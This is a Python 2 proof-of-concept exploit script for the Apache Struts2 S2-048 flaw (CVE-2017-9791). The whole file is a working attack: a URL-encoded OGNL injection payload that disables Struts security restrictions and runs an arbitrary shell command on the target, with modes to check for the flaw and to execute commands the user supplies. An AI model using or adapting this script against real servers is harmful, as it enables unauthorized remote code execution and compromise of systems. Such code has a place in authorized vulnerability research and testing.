'''
Created on 2017-7-8
CVE: CVE-2017-9791
@author: DragonEgg
'''
import sys
import urllib
import httplib
import urllib2  
httplib.HTTPConnection._http_vsn = 10  
httplib.HTTPConnection._http_vsn_str = 'HTTP/1.0'  

def request(cmd):
    cmd = urllib.quote(cmd) 
    data2="name=%25%7B%28%23_%3D%27multipart%2fform-data%27%29.%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27"+cmd+"%27%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2fc%27%2C%23cmd%7D%3A%7B%27%2fbin%2fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%29.%28@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D&age=123&__cheackbox_bustedBefore=true&description=123"
    return data2

def post(url, data): 
    try:
        req = urllib2.urlopen(url, data)
        content = req.read()
        return content
    except urllib2.URLError,e:
        print e
        exit()
def check(url):
    data=request('echo dragonegg')
    res = post(url, data)
    if 'dragonegg' in res:
        print 's2-048 \033[1;32m EXISTS \033[0m!'
    else:
        print 's2-048 \033[1;31m NOT EXISTS \033[0m!'
    
def poc(url,cmd):
    data=request(cmd)
    res = post(url, data)
    print res

def Usage():
    print 'check:'
    print '    python file.py http://1.1.1.1/struts2-showcase/integration/saveGangster.action'
    print 'poc:'
    print '    python file.py http://1.1.1.1/struts2-showcase/integration/saveGangster.action command'
    
if __name__ == '__main__':

    if len(sys.argv) == 2:
        check(sys.argv[1])
        
    elif len(sys.argv) == 3:
        poc(sys.argv[1],sys.argv[2])
        
    else:
        Usage()
        exit()
